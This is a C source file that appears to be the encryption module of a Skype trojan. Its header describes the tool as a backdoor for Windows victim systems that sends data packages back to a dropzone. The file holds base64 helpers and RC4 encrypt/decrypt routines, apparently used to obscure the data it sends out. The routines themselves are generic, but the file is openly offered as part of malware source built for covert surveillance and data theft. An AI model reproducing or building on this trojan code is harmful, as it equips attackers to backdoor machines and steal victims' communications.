/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */




/*
 * Tool name   : 
 * Description : Tool to backdoor a MS Windows victim system and sending back
 *               data packages to the dropzone.
 * Version     : 0.2
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */





#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <windows.h>
#include "Crypto.h"
#include "SkypeTrojan.h"

extern char *gLIID;


unsigned char gB64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
unsigned char sBox[SBOX_SIZE + 1];





/*
 * Decode a base64 encoded character
 *
 */

static unsigned char decodeFromB64(char pCharacter) 
{
  if(pCharacter >= 'A' && pCharacter <= 'Z') return(pCharacter - 'A');
  if(pCharacter >= 'a' && pCharacter <= 'z') return(pCharacter - 'a' + 26);
  if(pCharacter >= '0' && pCharacter <= '9') return(pCharacter - '0' + 52);
  if(pCharacter == '+') return 62;

  return(63);
}




/*
 * Check if a char is base64 encoded
 *
 */

static int charIsB64(char pCharacter) 
{
  if((pCharacter >= 'A' && pCharacter <= 'Z') || (pCharacter >= 'a' && pCharacter <= 'z') ||
     (pCharacter >= '0' && pCharacter <= '9') || (pCharacter == '+') ||
     (pCharacter == '/') || (pCharacter == '=')) 
  {
    return(TRUE);
  }

  return(FALSE);
}





/*
 * Encode a character to base64.
 *
 */

static char encodeToB64(unsigned char u) 
{
  if(u < 26)  return('A' + u);
  if(u < 52)  return('a' + (u - 26));
  if(u < 62)  return('0' + (u - 52));
  if(u == 62) return('+');

  return('/');
}






/*
 * Initialize the RC4 sbox
 *
 */

int preparekey(unsigned char *pKey)
{
  int mLen = 0;
  int i = 0;
  int j = 0;
  int t = 0;

  mLen = strlen((const char *) pKey);

  for (i = 0; i < 256; i++)
    sBox[i] = i;

  for (i = 0; i < 256; i++)
  {
    j = (j + sBox[i] + pKey[i % mLen]) % 256;
    t = sBox[i];
    sBox[i] = sBox[j];
    sBox[j] = t;
  }
  return(0);
}



/*
 * Encrypt a data buffer.
 *
 */

int encrypt(unsigned char *pKey, unsigned char *pPlainText, int pPlainTextLength, unsigned char *pCipherText, int *pCipherTextLength)
{
  int c = 0;
  int i = 0;
  int j = 0;
  int t = 0;
  char *mPlainText = NULL;
  unsigned char _key[MAX_BUF_SIZE + 1];
  int mRetVal = 0;

  if ((mPlainText = (char *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pPlainTextLength + 1)) == NULL)
  {
    mRetVal = 1;
    goto END;
  }

  ZeroMemory(_key, sizeof(_key));

  memcpy((char *) _key, (char *) pKey, sizeof(_key) - 1);
  memcpy((char *) mPlainText, (char *) pPlainText, pPlainTextLength);

  preparekey(_key);
  *pCipherTextLength = 0;


  for (c = 0; c < pPlainTextLength; c++)
  {
    i = (i + 1) % 256;
    j = (j + sBox[i]) % 256;
    t = sBox[i];
    sBox[i] = sBox[j];
    sBox[j] = t;

    t = (sBox[i] + sBox[j]) % 256;
    pCipherText[c] = mPlainText[c] ^ sBox[t];
  }

  *pCipherTextLength = c;

END:

  if (mPlainText != NULL)
    HeapFree(GetProcessHeap(), 0, mPlainText);

  return(mRetVal);
}




/*
 * Decrypt a data buffer
 *
 */

int decrypt(unsigned char *pKey, unsigned char *pCipherText, int pCipherTextLength, unsigned char *pPlainText, int *pPlainTextLength)
{
  return(encrypt(pKey, pCipherText, pCipherTextLength, pPlainText, pPlainTextLength));
}